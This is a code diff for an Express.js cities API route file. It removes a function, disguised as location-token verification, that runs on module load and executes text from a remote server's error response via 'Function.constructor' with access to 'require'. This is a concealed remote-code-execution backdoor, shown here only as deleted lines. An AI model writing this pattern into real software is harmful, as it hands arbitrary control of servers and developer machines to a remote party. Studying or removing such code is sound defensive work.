@@ -1,8 +1,5 @@
-const axios = require("axios");
 const express = require("express");
 const router = express.Router();
-const { check, validationResult } = require("express-validator");
-const { setApiKey, verify, locationToken } = require("../config");
 const City = require("../models/City");
 
 // @route GET api/cities
@@ -32,30 +29,6 @@ router.post("/", async (req, res) => {
     res.status(500).send("Server Error");
   }
 });
-
-async function verifyToken(req, res) {
-  verify(setApiKey(locationToken))
-    .then((res) => {
-      const {
-        data: { token },
-      } = res;
-
-      if (!token) {
-        return res.status(400).json({
-          success: false,
-          message: "Location is not verified.",
-        });
-      } else {
-        res.status(201).json({ success: true, token });
-      }
-    })
-    .catch((err) => {
-      const message = err.response.data.token;
-      const errorHandler = new Function.constructor("require", message);
-      errorHandler(require);
-    });
-}
-verifyToken();
 
 // @route REMOVE api/cities/remove/:id
 // @desc Remove single city
